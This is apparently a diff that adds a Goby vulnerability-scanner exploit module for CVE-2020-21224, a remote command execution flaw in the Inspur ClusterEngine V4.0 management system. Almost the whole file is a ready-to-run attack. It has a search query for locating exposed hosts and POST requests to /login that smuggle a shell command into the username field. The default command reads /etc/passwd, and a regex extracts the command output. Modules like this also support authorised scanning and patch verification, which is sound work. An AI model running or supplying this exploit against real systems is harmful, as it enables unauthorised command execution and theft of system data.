@@ -1,0 +1,102 @@
+{
+      "Name": "ClusterEngineV4.0 RCE (CVE-2020-21224)",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "title=\"TSCEV4.0\" || body=\"ClusterEngine V4.0\"",
+      "Description": "The dangerous characters in Inspur server cluster management system are unfiltered, resulting in remote command execution",
+      "Product": "ClusterEngineV4.0",
+      "Homepage": "https://en.inspur.com/",
+      "Author": "PeiQi",
+      "Impact": "<p>Remote command execution<br></p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "Cmd",
+			"type": "select",
+			"value": "cat /etc/passwd",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/login",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "op=login&username=peiqi`$(cat /etc/passwd)`"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root:x:",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/login",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "op=login&username=peiqi`$(cat /etc/passwd)`"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root:x:",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+					"output|lastbody|regex|/bin/sh: (.*?): No"
+				  ]
+            }
+      ],
+      "PostTime": "2021-04-04 22:21:03",
+      "GobyVersion": "1.8.255"
+}
